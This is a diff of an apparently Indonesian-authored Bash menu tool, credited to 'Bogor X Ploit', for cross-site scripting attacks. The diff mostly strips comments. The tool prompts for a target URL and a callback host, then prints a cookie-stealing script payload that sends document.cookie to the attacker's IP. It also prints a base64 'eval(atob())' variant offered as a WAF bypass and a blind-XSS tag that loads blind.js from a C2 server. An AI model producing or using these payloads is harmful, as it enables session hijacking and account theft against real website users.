@@ -4,7 +4,7 @@
 #   By Bogor X Ploit
 # ============================================
 
-# --- LIBRARY (Tanam Langsung, Ga Perlu File Luar) ---
+# --- LIBRARY (Tanam Langsung) ---
 C='\033[0;36m'; W='\033[1;37m'; R='\033[0;31m'; Y='\033[1;33m'; G='\033[0;32m'; N='\033[0m'
 
 bxp_encode_b64() { echo -n "$1" | base64 -w 0; }
@@ -26,14 +26,11 @@ trap_ctrl_c() { echo -e "\n${R}[!] Listener stopped by user.${N}"; sleep 1; }
 # -------------------------------------------------
 
 while true; do
-    # Panggil ASCII Gede
     bxp_ascii_title
     
     echo -e "${C}  ==================================================${N}"
     echo -e "${C}  --------------------------------------------------${N}"
     echo ""
-
-    # Menu Lega & Tebal
     echo -e "  \033[1;32m[1]\033[0m  \033[1;37mInitiate Basic Session Hook\033[0m"
     echo ""
     echo -e "  \033[1;32m[2]\033[0m  \033[1;37mDeploy Blind Session Vector\033[0m"
@@ -42,7 +39,6 @@ while true; do
     echo ""
     echo -e "  \033[1;31m[4]\033[0m  \033[1;37mBack to Main Menu\033[0m"
     echo ""
-
     echo -e "${C}  --------------------------------------------------${N}"
     echo ""
     echo -ne "  ${Y}Select option > ${N}"
@@ -54,18 +50,14 @@ while true; do
             echo -ne "  ${Y}Enter Target URL > ${N}"
             read -r target
             if [ -z "$target" ]; then echo -e "  ${R}[!] Error: Target URL empty.${N}"; sleep 1.5; continue; fi
-
             echo -ne "  ${Y}Enter Callback IP > ${N}"
             read -r callback_url
             if [ -z "$callback_url" ]; then echo -e "  ${R}[!] Error: Callback IP empty.${N}"; sleep 1.5; continue; fi
-            
             echo ""
             echo -e "  ${G}[+] Initializing WAF Bypass...${N}"; sleep 1
-            
             RAW_PAYLOAD="<script>new Image().src='http://${callback_url}:2010/?c='+document.cookie;</script>"
             B64_PAYLOAD=$(bxp_encode_b64 "$RAW_PAYLOAD")
             STEALTH_PAYLOAD="<script>eval(atob('${B64_PAYLOAD}'));</script>"
-            
             echo ""
             echo -e "  ${W}Raw Vector:${N} $RAW_PAYLOAD"
             echo ""
@@ -78,10 +70,8 @@ while true; do
             echo -ne "  ${Y}Enter C2 Receiver URL > ${N}"
             read -r c2_url
             if [ -z "$c2_url" ]; then echo -e "  ${R}[!] Error: C2 URL empty.${N}"; sleep 1.5; continue; fi
-
             echo ""
             echo -e "  ${G}[+] Deploying Blind Vector...${N}"; sleep 1
-            
             PAYLOAD="<script src=\"http://${c2_url}:2010/blind.js\"></script>"
             echo ""
             echo -e "  ${W}Vector:${N} $PAYLOAD"
